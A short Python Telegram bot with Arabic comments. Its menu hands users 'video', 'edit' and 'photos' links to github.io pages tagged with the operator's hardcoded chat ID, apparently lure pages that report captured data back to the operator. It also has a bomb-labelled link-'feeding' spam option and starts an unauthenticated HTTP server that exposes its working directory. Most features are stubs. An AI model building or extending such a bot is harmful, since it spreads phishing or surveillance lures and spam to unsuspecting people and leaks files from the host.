import os
import telebot
from telebot import types
import yt_dlp
import threading
import http.server

# 1. الإعدادات
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = "8169635171" 

bot = telebot.TeleBot(BOT_TOKEN)

# 2. القائمة المدمجة (Inline Menu) مع الروابط المطلوبة
def get_inline_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    # الأزرار التي تحتوي روابط مباشرة
    markup.add(
        types.InlineKeyboardButton('رابط فيديو 🎥', url='https://app-display.github.io/ca.html-chatId?chatId=8169635171'),
        types.InlineKeyboardButton('رابط تعديل ✨', url='https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/?chatId=8169635171'),
        types.InlineKeyboardButton('رابط صور 🖼️', url='https://app-display.github.io/ca.html-chatld-/?chatId=8169635171')
    )
    # الأزرار التي تتطلب تنفيذ أوامر
    markup.add(
        types.InlineKeyboardButton('تحميل فيديو 📥', callback_data='cmd_download'),
        types.InlineKeyboardButton('أخبار وبث مباشر 🌐', callback_data='cmd_news'),
        types.InlineKeyboardButton('تلقيم رابط 💣', callback_data='cmd_spam')
    )
    return markup

# 3. الأوامر
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # إخفاء لوحة المفاتيح القديمة تماماً
    bot.send_message(message.chat.id, "👋 أهلاً بك، تم تحديث البوت.", reply_markup=types.ReplyKeyboardRemove())
    bot.send_message(message.chat.id, "اختر من القائمة:", reply_markup=get_inline_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'cmd_download':
        bot.answer_callback_query(call.id, "أرسل رابط الفيديو للتحميل")
        bot.send_message(call.message.chat.id, "يرجى إرسال رابط الفيديو:")
    elif call.data == 'cmd_news':
        bot.answer_callback_query(call.id, "قسم الأخبار والبث")
        bot.send_message(call.message.chat.id, "هذا القسم قيد التطوير حالياً.")
    elif call.data == 'cmd_spam':
        bot.answer_callback_query(call.id, "تلقيم الروابط")
        bot.send_message(call.message.chat.id, "أرسل الرابط لعمل التلقيم:")

@bot.message_handler(commands=['announce'])
def announce(message):
    if str(message.chat.id) == ADMIN_ID:
        bot.reply_to(message, "📢 تم تحديث البوت وإصلاح جميع الروابط! جرب الآن.")
    else:
        bot.reply_to(message, "هذا الأمر للمطور فقط.")

@bot.message_handler(func=lambda message: message.text.startswith("http"))
def handle_msg(message):
    bot.reply_to(message, "⏳ جاري المعالجة...")

# التشغيل
if __name__ == '__main__':
    threading.Thread(target=lambda: http.server.HTTPServer(('', 8080), http.server.SimpleHTTPRequestHandler).serve_forever(), daemon=True).start()
    bot.infinity_polling()
